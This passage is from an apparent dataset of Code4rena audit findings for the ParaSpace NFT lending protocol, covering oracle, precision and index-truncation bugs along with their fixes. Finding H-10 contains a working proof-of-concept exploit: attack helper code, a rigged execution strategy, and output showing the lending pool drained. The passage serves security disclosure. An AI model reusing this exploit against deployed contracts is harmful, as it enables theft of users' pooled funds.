      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/marketplaces/LooksRareAdapter.sol#L73-L94><br>\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/marketplaces/SeaportAdapter.sol#L93-L107><br>\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/marketplaces/X2Y2Adapter.sol#L88-L102>\n\nmatchAskWithTakerBid is payable, it calls `functionCallWithValue` with the value parameter. There are no checks to make sure `msg.value == value\\`, if excess value is sent user will not receive a refund.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/marketplaces/LooksRareAdapter.sol#L73-L94>\n\n```solidity\n    function matchAskWithTakerBid(\n        address marketplace,\n        bytes calldata params,\n        uint256 value\n    ) external payable override returns (bytes memory) {\n        bytes4 selector;\n        if (value == 0) {\n            selector = ILooksRareExchange.matchAskWithTakerBid.selector;\n        } else {\n            selector = ILooksRareExchange\n                .matchAskWithTakerBidUsingETHAndWETH\n                .selector;\n        }\n        bytes memory data = abi.encodePacked(selector, params);\n        return\n            Address.functionCallWithValue(\n                marketplace,\n                data,\n                value,\n                Errors.CALL_MARKETPLACE_FAILED\n            );\n    }\n```\n\nSame code exists in LooksRareAdapter, SeaportAdapter, and X2Y2Adapter.\n\n### Recommended Mitigation Steps\n\nCheck `msg.value == value`<br>\nIf the function is only supposed to be delegate called into, consider adding a check to prevent direct call.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the vulnerability in the code of the Paraspace project, which is a decentralized marketplaces. The vulnerability is that the function matchAskWithTakerBid is payable, and it calls the functionCallWithValue with the value parameter. However, there is no check to make sure that the msg.value is equal to the value parameter. This means that if a user sends an excess value, they will not receive a refund. \n\nThe code for the vulnerability can be found at the following links: \nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/marketplaces/LooksRareAdapter.sol#L73-L94\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/marketplaces/SeaportAdapter.sol#L93-L107\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/marketplaces/X2Y2Adapter.sol#L88-L102\n\nThe impact of this vulnerability is that users can send an excess value and not receive a refund. As a result, they could lose money. The recommended mitigation steps are to check that the msg.value is equal to the value parameter, and to consider adding a check to prevent direct calls if the function is only supposed to be delegate called into.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/215",
      "tags": [],
      "finders": [
        "ayeslick  Dravee",
        "gzeon"
      ]
    },
    {
      "id": "15984",
      "title": "[M-01] Semi-erroneous Median Value",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/main/paraspace-core/contracts/misc/NFTFloorOracle.sol#L429>\n\nIn `NFTFloorOracle.sol`, `_combine()` returns a validated `medianPrice` on line 429 after having `validPriceList` sorted in ascending order.\n\nIt will return a correct median as along as the array entails an odd number of valid prices. However, if there were an even number of valid prices, the median was supposed to be the average of the two middle values according to the median formula below:\n\n#### Median Formula\n\n![median formula](https://www.gstatic.com/education/formulas2/472522532/en/median_formula.svg)\n\n![x](https://www.gstatic.com/education/formulas2/472522532/en/median_formula_median_formula_var\\_1.svg)   =\tordered list of values in data set<br>\n![n](https://www.gstatic.com/education/formulas2/472522532/en/median_formula_median_formula_var\\_2.svg)    =\t number of values in data set\n\nThe impact could be significant in edge cases and affect all function calls dependent on the finalized `twap`.\n\n### Proof of Concept\n\nLet's assume there are four valid ether prices each of which is 1.5 times more than the previous one:\n\n`validPriceList = [1000, 1500, 2250, 3375]`\n\nInstead of returning `(1500 + 2250) / 2 = 1875`, 2250 is returned, incurring a 20% increment or 120 price deviation.\n\n### Recommended Mitigation Steps\n\nConsider having line 429 refactored as follows:\n\n            if (validNum % 2 != 0) {\n                return (true, validPriceList[validNum / 2]);\n            }\n            else\n                return (true, (validPriceList[validNum / 2] + validPriceList[(validNum / 2) - 1]) / 2); \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `NFTFloorOracle.sol` contract, which is part of the `paraspace-core` repository on GitHub. The vulnerability affects the `_combine()` function, which is used to calculate the median price of a set of valid prices. The median price is calculated by taking the average of the two middle values of the sorted array of valid prices, as per the median formula. \n\nThe impact of this vulnerability is that if the array of valid prices has an even number of values, the median price returned by the function is incorrect. This could cause a significant deviation in the price, up to 20%, in certain edge cases.\n\nThe proof of concept for this vulnerability was demonstrated using an array of four valid ether prices, each of which was 1.5 times more than the previous one. In this case, the function should have returned the average of the two middle values, but instead returned the higher of the two. \n\nThe vulnerability was discovered through manual inspection. The recommended mitigation step is to refactor line 429 of the `_combine()` function to take the average of the two middle values when the array of valid prices has an even number of values.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/38",
      "tags": [],
      "finders": [
        "RaymondFam"
      ]
    },
    {
      "id": "15983",
      "title": "[H-10] Attacker can drain pool using executeBuyWithCredit with malicious marketplace payload",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/marketplaces/LooksRareAdapter.sol#L59\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/MarketplaceLogic.sol#L397\n\n\n## Vulnerability details\n\n## Description\n\nParaspace supports leveraged purchases of NFTs through PoolMarketplace entry points. User calls buyWithCredit with marketplace, calldata to be sent to marketplace, and how many tokens to borrow.\n```\nfunction buyWithCredit(\n    bytes32 marketplaceId,\n    bytes calldata payload,\n    DataTypes.Credit calldata credit,\n    uint16 referralCode\n) external payable virtual override nonReentrant {\n    DataTypes.PoolStorage storage ps = poolStorage();\n    MarketplaceLogic.executeBuyWithCredit(\n        marketplaceId,\n        payload,\n        credit,\n        ps,\n        ADDRESSES_PROVIDER,\n        referralCode\n    );\n}\n```\n\nIn executeBuyWithCredit, orders are deserialized from the payload user sent to a DataTypes.OrderInfo structure. Each MarketplaceAdapter is required to fulfil that functionality through getAskOrderInfo:\n```\nDataTypes.OrderInfo memory orderInfo = IMarketplace(marketplace.adapter)\n    .getAskOrderInfo(payload, vars.weth);\n```\n\nIf we take a look at LooksRareAdapter's getAskOrderInfo, it will the consideration parameter using only the MakerOrder parameters, without taking into account TakerOrder params\n```\n(\n    OrderTypes.TakerOrder memory takerBid,\n    OrderTypes.MakerOrder memory makerAsk\n) = abi.decode(params, (OrderTypes.TakerOrder, OrderTypes.MakerOrder));\norderInfo.maker = makerAsk.signer;\n\nconsideration[0] = ConsiderationItem(\n    itemType,\n    token,\n    0,\n    makerAsk.price, // TODO: take minPercentageToAsk into account\n    makerAsk.price,\n    payable(takerBid.taker)\n);\n```\n\nThe OrderInfo constructed, which contains the consideration item from maker, is used in \\_delegateToPool, called by \\_buyWithCredit(), called by executeBuyWithCredit:\n\n```\nfor (uint256 i = 0; i < params.orderInfo.consideration.length; i++) {\n    ConsiderationItem memory item = params.orderInfo.consideration[i];\n    require(\n        item.startAmount == item.endAmount,\n        Errors.INVALID_MARKETPLACE_ORDER\n    );\n    require(\n        item.itemType == ItemType.ERC20 ||\n            (vars.isETH && item.itemType == ItemType.NATIVE),\n        Errors.INVALID_ASSET_TYPE\n    );\n    require(\n        item.token == params.credit.token,\n        Errors.CREDIT_DOES_NOT_MATCH_ORDER\n    );\n    price += item.startAmount;\n}\n```\n\nThe total price is charged to msg.sender, and he will pay it with debt tokens + immediate downpayment. \nAfter enough funds are transfered to the Pool contract, it delegatecalls to the LooksRare adapter, which will do the actual call to LooksRareExchange. The exchange will send the money gathered in the pool to maker, and give it the NFT.\n\nThe issue is that attacker can supply a different price in the MakerOrder and TakerOrder passed as payload to LooksRare. The maker price will be reflected in the registered price charged to user, but taker price will be the one actually transferred from Pool. \n\nTo show taker price is what counts, this is the code in LooksRareExchange.sol:\n```\nfunction matchAskWithTakerBid(OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk)\n    external\n    override\n    nonReentrant\n{\n    require((makerAsk.isOrderAsk) && (!takerBid.isOrderAsk), \"Order: Wrong sides\");\n    require(msg.sender == takerBid.taker, \"Order: Taker must be the sender\");\n    // Check the maker ask order\n    bytes32 askHash = makerAsk.hash();\n    _validateOrder(makerAsk, askHash);\n    (bool isExecutionValid, uint256 tokenId, uint256 amount) = IExecutionStrategy(makerAsk.strategy)\n        .canExecuteTakerBid(takerBid, makerAsk);\n    require(isExecutionValid, \"Strategy: Execution invalid\");\n    // Update maker ask order status to true (prevents replay)\n    _isUserOrderNonceExecutedOrCancelled[makerAsk.signer][makerAsk.nonce] = true;\n    // Execution part 1/2\n    _transferFeesAndFunds(\n        makerAsk.strategy,\n        makerAsk.collection,\n        tokenId,\n        makerAsk.currency,\n        msg.sender,\n        makerAsk.signer,\n        takerBid.price,   <--- taker price is what's charged\n        makerAsk.minPercentageToAsk\n    );\n\t...\n}\n```\n\nSince attacker will be both maker and taker in this flow,  he has no problem in supplying a strategy which will accept higher taker price than maker price. It will pass this check:\n```\n(bool isExecutionValid, uint256 tokenId, uint256 amount) = IExecutionStrategy(makerAsk.strategy)\n    .canExecuteTakerBid(takerBid, makerAsk);\n```\n\nIt is important to note that for this exploit we can pass a 0 credit loan amount, which allows the stolen asset to be any asset, not just ones supported by the pool. This is because of early return in \\_borrowTo() and \\repay() functions. \n\nThe attack POC looks as follows:\n1. Taker (attacker) has 10 DAI \n2. Pool has 990 DAI\n3. Maker (attacker) has 1 doodle NFT.\n4. Taker submits buyWithCredit() transaction:\n- credit amount 0\n- TakerOrder with 1000 amount\n- MakerOrder with 10 amount and \"accept all\" execution strategy\n5. Pool will take the 10 DAI from taker and additional 990 DAI from it's own funds and send to Maker.\n6. Attacker ends up with both 1000 DAI and an nToken of the NFT\n\n## Impact\n\nAny ERC20 tokens which exist in the pool contract can be drained by an attacker.\n\n## Proof of Concept\n\nIn \\_pool_marketplace_buy_wtih_credit.spec.ts, add this test:\n```\nit(\"looksrare attack\", async () => {\n  const {\n    doodles,\n    dai,\n    pool,\n    users: [maker, taker, middleman],\n  } = await loadFixture(testEnvFixture);\n  const payNowNumber = \"10\";\n  const poolVictimNumber = \"990\";\n  const payNowAmount = await convertToCurrencyDecimals(\n    dai.address,\n    payNowNumber\n  );\n  const poolVictimAmount = await convertToCurrencyDecimals(\n    dai.address,\n      poolVictimNumber\n  );\n  const totalAmount = payNowAmount.add(poolVictimAmount);\n  const nftId = 0;\n  // mint DAI to offer\n  // We don't need to give taker any money, he is not charged\n  // Instead, give the pool money\n  await mintAndValidate(dai, payNowNumber, taker);\n  await mintAndValidate(dai, poolVictimNumber, pool);\n  // middleman supplies DAI to pool to be borrowed by offer later\n  //await supplyAndValidate(dai, poolVictimNumber, middleman, true);\n  // maker mint mayc\n  await mintAndValidate(doodles, \"1\", maker);\n  // approve\n  await waitForTx(\n    await dai.connect(taker.signer).approve(pool.address, payNowAmount)\n  );\n  console.log(\"maker balance before\", await dai.balanceOf(maker.address))\n  console.log(\"taker balance before\", await dai.balanceOf(taker.address))\n  console.log(\"pool balance before\", await dai.balanceOf(pool.address))\n  await executeLooksrareBuyWithCreditAttack(\n    doodles,\n    dai,\n    payNowAmount,\n    totalAmount,\n    0,\n    nftId,\n    maker,\n    taker\n  );\n```\n\nIn marketplace-helper.ts, please copy in the following attack code:\n```\nexport async function executeLooksrareBuyWithCreditAttack(\n    tokenToBuy: MintableERC721 | NToken,\n    tokenToPayWith: MintableERC20,\n    makerAmount: BigNumber,\n    takerAmount: BigNumber,\n    creditAmount : BigNumberish,\n    nftId: number,\n    maker: SignerWithAddress,\n    taker: SignerWithAddress\n) {\n  const signer = DRE.ethers.provider.getSigner(maker.address);\n  const chainId = await maker.signer.getChainId();\n  const nonce = await maker.signer.getTransactionCount();\n\n  // approve\n  await waitForTx(\n      await tokenToBuy\n          .connect(maker.signer)\n          .approve((await getTransferManagerERC721()).address, nftId)\n  );\n\n  const now = Math.floor(Date.now() / 1000);\n  const paramsValue = [];\n  const makerOrder: MakerOrder = {\n    isOrderAsk: true,\n    signer: maker.address,\n    collection: tokenToBuy.address,\n    // Listed Maker price not includes payLater amount which is stolen\n    price: makerAmount,\n    tokenId: nftId,\n    amount: \"1\",\n    strategy: (await getStrategyStandardSaleForFixedPrice()).address,\n    currency: tokenToPayWith.address,\n    nonce: nonce,\n    startTime: now - 86400,\n    endTime: now + 86400, // 2 days validity\n    minPercentageToAsk: 7500,\n    params: paramsValue,\n  };\n\n  const looksRareExchange = await getLooksRareExchange();\n\n  const {domain, value, type} = generateMakerOrderTypedData(\n      maker.address,\n      chainId,\n      makerOrder,\n      looksRareExchange.address\n  );\n\n  const signatureHash = await signer._signTypedData(domain, type, value);\n\n  const makerOrderWithSignature: MakerOrderWithSignature = {\n    ...makerOrder,\n    signature: signatureHash,\n  };\n\n  const vrs = DRE.ethers.utils.splitSignature(\n      makerOrderWithSignature.signature\n  );\n\n  const makerOrderWithVRS: MakerOrderWithVRS = {\n    ...makerOrderWithSignature,\n    ...vrs,\n  };\n  const pool = await getPoolProxy();\n  const takerOrder: TakerOrder = {\n    isOrderAsk: false,\n    taker: pool.address,\n    price: takerAmount,\n    tokenId: makerOrderWithSignature.tokenId,\n    minPercentageToAsk: 7500,\n    params: paramsValue,\n  };\n\n  const encodedData = looksRareExchange.interface.encodeFunctionData(\n      \"matchAskWithTakerBid\",\n      [takerOrder, makerOrderWithVRS]\n  );\n\n  const tx = pool.connect(taker.signer).buyWithCredit(\n      LOOKSRARE_ID,\n      `0x${encodedData.slice(10)}`,\n      {\n        token: tokenToPayWith.address,\n        amount: creditAmount,\n        orderId: constants.HashZero,\n        v: 0,\n        r: constants.HashZero,\n        s: constants.HashZero,\n      },\n      0,\n      {\n        gasLimit: 5000000,\n      }\n  );\n\n  await (await tx).wait();\n}\n```\n\nFinally, we need to change the passed execution strategy. In StrategyStandardSaleForFixedPrice.sol, change canExecuteTakerBid:\n```\nfunction canExecuteTakerBid(OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk)\n    external\n    view\n    override\n    returns (\n        bool,\n        uint256,\n        uint256\n    )\n{\n    return (\n        //((makerAsk.price == takerBid.price) &&\n        //    (makerAsk.tokenId == takerBid.tokenId) &&\n        //    (makerAsk.startTime <= block.timestamp) &&\n        //    (makerAsk.endTime >= block.timestamp)),\n        true,\n        makerAsk.tokenId,\n        makerAsk.amount\n    );\n}\n```\n\nWe can see the output:\n```\nmaker balance before BigNumber { value: \"0\" }\ntaker balance before BigNumber { value: \"10000000000000000000\" }\npool balance before BigNumber { value: \"990000000000000000000\" }\nmaker balance after BigNumber { value: \"1000000000000000000000\" }\ntaker balance after BigNumber { value: \"0\" }\npool balance after BigNumber { value: \"0\" }\n\n  Leveraged Buy - Positive tests\n     looksrare attack (34857ms)\n\n\n  1 passing (54s)\n\n```\n\n## Tools Used\n\nManual audit\n\n## Recommended Mitigation Steps\n\nIt is important to validate that the price charged to user is the same price taken from the Pool contract:\n```\n// In LooksRareAdapter's getAskOrderInfo:\nrequire(makerAsk.price, takerBid.price)\n```",
      "summary": "\nThis bug report is about an exploit that allows an attacker to drain any ERC20 tokens that exist in the Pool contract. The exploit takes advantage of the fact that the code in the LooksRareAdapter's getAskOrderInfo does not take into account the TakerOrder parameters when constructing the consideration parameter. This means that the maker price will be reflected in the registered price charged to the user, but the taker price will be the one actually transferred from the Pool. \n\nThe attack POC involves the attacker submitting a buyWithCredit transaction with a TakerOrder with a higher amount than the MakerOrder, and the Pool will take the difference from its own funds and send it to the Maker. This allows the attacker to end up with both the DAI and the NFT.\n\nTo mitigate this exploit, it is important to validate that the price charged to the user is the same price taken from the Pool contract. This can be done by requiring that the makerAsk.price and takerBid.price are equal in LooksRareAdapter's getAskOrderInfo.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/498",
      "tags": [],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "15982",
      "title": "[H-09] UniswapV3 tokens of certain pairs will be wrongly valued, leading to liquidations",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/UniswapV3OracleWrapper.sol#L245>\n\nUniswapV3OracleWrapper is responsible for price feed of UniswapV3 NFT tokens. Its getTokenPrice() is used by the health check calculation in GenericLogic.\n\ngetTokenPrice gets price from the oracle and then uses it to calculate value of its liquidity.\n\n    function getTokenPrice(uint256 tokenId) public view returns (uint256) {\n        UinswapV3PositionData memory positionData = getOnchainPositionData(\n            tokenId\n        );\n        PairOracleData memory oracleData = _getOracleData(positionData);\n        (uint256 liquidityAmount0, uint256 liquidityAmount1) = LiquidityAmounts\n            .getAmountsForLiquidity(\n                oracleData.sqrtPriceX96,\n                TickMath.getSqrtRatioAtTick(positionData.tickLower),\n                TickMath.getSqrtRatioAtTick(positionData.tickUpper),\n                positionData.liquidity\n            );\n        (\n            uint256 feeAmount0,\n            uint256 feeAmount1\n        ) = getLpFeeAmountFromPositionData(positionData);\n        return\n            (((liquidityAmount0 + feeAmount0) * oracleData.token0Price) /\n                10**oracleData.token0Decimal) +\n            (((liquidityAmount1 + feeAmount1) * oracleData.token1Price) /\n                10**oracleData.token1Decimal);\n    }\n\nIn `_getOracleData`,  sqrtPriceX96 of the holding is calculated, using square root of token0Price and token1Price, corrected for difference in decimals. In case they have same decimals, this is the calculation:\n\n    if (oracleData.token1Decimal == oracleData.token0Decimal) {\n        // multiply by 10^18 then divide by 10^9 to preserve price in wei\n        oracleData.sqrtPriceX96 = uint160(\n            (SqrtLib.sqrt(\n                ((oracleData.token0Price * (10**18)) /\n                    (oracleData.token1Price))\n            ) * 2**96) / 1E9\n        );\n\nThe issue is that the inner calculation, could be 0, making the whole expression zero, although price is not.\n\n    ((oracleData.token0Price * (10**18)) /\n                            (oracleData.token1Price))\n\nThis expression will be 0 if `oracleData.token1Price > token0Price * 10**18`. This is not far fetched, as there is massive difference in prices of different ERC20 tokens due to tokenomic models. For example, WETH (18 decimals) is `$1300`, while BTT (18 decimals) is `$0.00000068`.\n\nThe price is represented using X96 type, so there is plenty of room to fit the price between two tokens of different values. It is just that the number is multiplied by 2&ast;&ast;96 too late in the calculation, after the division result is zero.\n\nBack in getTokenPrice, the sqrtPriceX96 parameter which can be zero, is passed to `LiquidityAmounts.getAmountsForLiquidity()` to get liquidity values. In case price is zero, the liquidity calculator will assume all holdings are amount0, while in reality they could be all amount1, or a combination of the two.\n\n    function getAmountsForLiquidity(\n        uint160 sqrtRatioX96,\n        uint160 sqrtRatioAX96,\n        uint160 sqrtRatioBX96,\n        uint128 liquidity\n    ) internal pure returns (uint256 amount0, uint256 amount1) {\n        if (sqrtRatioAX96 > sqrtRatioBX96)\n            (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);\n        if (sqrtRatioX96 <= sqrtRatioAX96) { <- Always drop here when 0\n            amount0 = getAmount0ForLiquidity(\n                sqrtRatioAX96,\n                sqrtRatioBX96,\n                liquidity\n            );\n        } else if (sqrtRatioX96 < sqrtRatioBX96) {\n            amount0 = getAmount0ForLiquidity(\n                sqrtRatioX96,\n                sqrtRatioBX96,\n                liquidity\n            );\n            amount1 = getAmount1ForLiquidity(\n                sqrtRatioAX96,\n                sqrtRatioX96,\n                liquidity\n            );\n        } else {\n            amount1 = getAmount1ForLiquidity(\n                sqrtRatioAX96,\n                sqrtRatioBX96,\n                liquidity\n            );\n        }\n    }\n\nSince amount0 is the lower value between the two, it is easy to see that the calculated liquidity value will be much smaller than it should be, and as a result the entire Uniswapv3 holding is valuated much lower than it should. Ultimately, it will cause liquidation the moment the ratio between some uniswap pair goes over 10&ast;&ast;18.\n\nFor the sake of completeness, healthFactor is calculated by  `calculateUserAccountData`, which calls `_getUserBalanceForUniswapV3`, which queries the oracle with `_getTokenPrice`.\n\n### Impact\n\nUniswapV3 tokens of certain pairs will be wrongly valued, leading to liquidations.\n\n### Proof of Concept\n\n1.  Alice deposits a uniswap v3 liquidity token as collateral in ParaSpace (Pair A/B)\n2.  Value of B rises in comparison to A. Now PriceB = PriceA &ast; 10&ast;&ast;18\n3.  sqrtPrice resolves to 0, and entire liquidity is taken as A liquidity. In reality, price is between tickUpper and tickLower of the uniswap token. B tokens are not taken into consideration.\n4.  Liquidator Luke initiates liquidation of Alice. Alice may lose her NFT collateral although she has kept her position healthy.\n\n### Recommended Mitigation Steps\n\nMultiply by 2&ast;&ast;96 before the division operation in sqrtPriceX96 calculation.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with UniswapV3OracleWrapper, which is responsible for price feed of UniswapV3 NFT tokens. The issue is that the calculation for the price of the NFT token could be 0, although the price is not. This is due to a difference in decimals between two tokens. As a result, the liquidity calculator will assume all holdings are amount0, while in reality they could be all amount1, or a combination of the two. This will lead to incorrect valuations of UniswapV3 tokens of certain pairs, which will ultimately cause liquidation of the holding even if it is healthy. The recommended mitigation step is to multiply by 2\\*\\*96 before the division operation in sqrtPriceX96 calculation.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/486",
      "tags": [
        "Uniswap",
        "Precision Loss"
      ],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "15981",
      "title": "[H-08] NFTFloorOracles asset and feeder structures can be corrupted",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L278-L286\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L307-L316\n\n\n## Vulnerability details\n\nNFTFloorOracle's _addAsset() and _addFeeder() truncate the `assets` and `feeders` arrays indices to 255, both using `uint8 index` field in the corresponding structures and performing `uint8(assets.length - 1)` truncation on the new element addition.\n\n`2^8 - 1` looks to be too tight as an **all time** element count limit. It can be realistically surpassed in a couple years time, especially given multi-asset and multi-feeder nature of the protocol. This way this isn't a theoretical unsafe truncation, but an accounting malfunction that is practically reachable given long enough system lifespan, without any additional requirements as asset/feeder turnaround is a going concern state of the system.\n\n## Impact\n\nOnce truncation start corrupting the indices the asset/feeder structures will become incorrectly referenced and removal of an element will start to remove another one, permanently breaking up the structures.\n\nThis will lead to inability to control these structures and then to Oracle malfunction. This can lead to collateral mispricing. Setting the severity to be medium due to prerequisites.\n\n## Proof of Concept\n\n`feederPositionMap` and `assetFeederMap` use `uint8` indices:\n\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L32-L48\n\n```solidity\nstruct FeederRegistrar {\n    // if asset registered or not\n    bool registered;\n    // index in asset list\n    uint8 index;\n    // if asset paused,reject the price\n    bool paused;\n    // feeder -> PriceInformation\n    mapping(address => PriceInformation) feederPrice;\n}\n\nstruct FeederPosition {\n    // if feeder registered or not\n    bool registered;\n    // index in feeder list\n    uint8 index;\n}\n```\n\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L79-L88\n\n```solidity\n    /// @dev feeder map\n    // feeder address -> index in feeder list\n    mapping(address => FeederPosition) private feederPositionMap;\n\n    ...\n\n    /// @dev Original raw value to aggregate with\n    // the NFT contract address -> FeederRegistrar which contains price from each feeder\n    mapping(address => FeederRegistrar) public assetFeederMap;\n```\n\nOn entry removal both `assets` array length do not decrease:\n\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L296-L305\n\n```solidity\n    function _removeAsset(address _asset)\n        internal\n        onlyWhenAssetExisted(_asset)\n    {\n        uint8 assetIndex = assetFeederMap[_asset].index;\n        delete assets[assetIndex];\n        delete assetPriceMap[_asset];\n        delete assetFeederMap[_asset];\n        emit AssetRemoved(_asset);\n    }\n```\n\nOn the contrary, feeders array is being decreased:\n\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L326-L338\n\n```solidity\n    function _removeFeeder(address _feeder)\n        internal\n        onlyWhenFeederExisted(_feeder)\n    {\n        uint8 feederIndex = feederPositionMap[_feeder].index;\n        if (feederIndex >= 0 && feeders[feederIndex] == _feeder) {\n            feeders[feederIndex] = feeders[feeders.length - 1];\n            feeders.pop();\n        }\n        delete feederPositionMap[_feeder];\n        revokeRole(UPDATER_ROLE, _feeder);\n        emit FeederRemoved(_feeder);\n    }\n```\n\nI.e. `assets` array element is set to zero with `delete`, but not removed from the array.\n\nThis means that `assets` will only grow over time, and will eventually surpass `2^8 - 1 = 255`. That's realistic given that assets here are NFTs, whose variety will increase over time.\n\nOnce this happen the truncation will start to corrupt the indices:\n\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L278-L286\n\n```solidity\n    function _addAsset(address _asset)\n        internal\n        onlyWhenAssetNotExisted(_asset)\n    {\n        assetFeederMap[_asset].registered = true;\n        assets.push(_asset);\n        assetFeederMap[_asset].index = uint8(assets.length - 1);\n        emit AssetAdded(_asset);\n    }\n```\n\nThis can happen with `feeders` too, if the count merely surpass `255` with net additions:\n\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L307-L316\n\n```solidity\n    function _addFeeder(address _feeder)\n        internal\n        onlyWhenFeederNotExisted(_feeder)\n    {\n        feeders.push(_feeder);\n        feederPositionMap[_feeder].index = uint8(feeders.length - 1);\n        feederPositionMap[_feeder].registered = true;\n        _setupRole(UPDATER_ROLE, _feeder);\n        emit FeederAdded(_feeder);\n    }\n```\n\nThis will lead to _removeAsset() and _removeFeeder() clearing another assets/feeders as the `assetFeederMap[_asset].index` and `feederPositionMap[_feeder].index` become broken being truncated. It will permanently mess the structures.\n\n## Recommended Mitigation Steps\n\nAs a simplest measure consider increasing the limit to `2^32 - 1`:\n\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L278-L286\n\n```solidity\n    function _addAsset(address _asset)\n        internal\n        onlyWhenAssetNotExisted(_asset)\n    {\n        assetFeederMap[_asset].registered = true;\n        assets.push(_asset);\n-       assetFeederMap[_asset].index = uint8(assets.length - 1);\n+       assetFeederMap[_asset].index = uint32(assets.length - 1);\n        emit AssetAdded(_asset);\n    }\n```\n\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L307-L316\n\n```solidity\n    function _addFeeder(address _feeder)\n        internal\n        onlyWhenFeederNotExisted(_feeder)\n    {\n        feeders.push(_feeder);\n-       feederPositionMap[_feeder].index = uint8(feeders.length - 1);\n+       feederPositionMap[_feeder].index = uint32(feeders.length - 1);\n        feederPositionMap[_feeder].registered = true;\n        _setupRole(UPDATER_ROLE, _feeder);\n        emit FeederAdded(_feeder);\n    }\n```\n\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L32-L48\n\n```solidity\nstruct FeederRegistrar {\n    // if asset registered or not\n    bool registered;\n    // index in asset list\n-   uint8 index;\n+   uint32 index;\n    // if asset paused,reject the price\n    bool paused;\n    // feeder -> PriceInformation\n    mapping(address => PriceInformation) feederPrice;\n}\n\nstruct FeederPosition {\n    // if feeder registered or not\n    bool registered;\n    // index in feeder list\n-   uint8 index;\n+   uint32 index;\n}\n```\n\nAlso, consider actually removing `assets` array element in _removeAsset() via the usual moving of the last element as it's done in _removeFeeder().",
      "summary": "\nThis bug report is regarding the NFTFloorOracle contract in the Paraspace project. The contract has two arrays: assets and feeders, which are used to store asset and feeder information. These arrays have a limit of 255 elements, which is too low for a project that is expected to have a long lifespan. The problem is that the contract truncates the indices of the arrays when adding new elements, and this truncation can corrupt the indices and lead to the permanent breaking of the structures. This will lead to an Oracle malfunction and collateral mispricing. The recommended mitigation steps are to increase the limit to 2^32 - 1, and to remove the assets array element in the _removeAsset() function.",
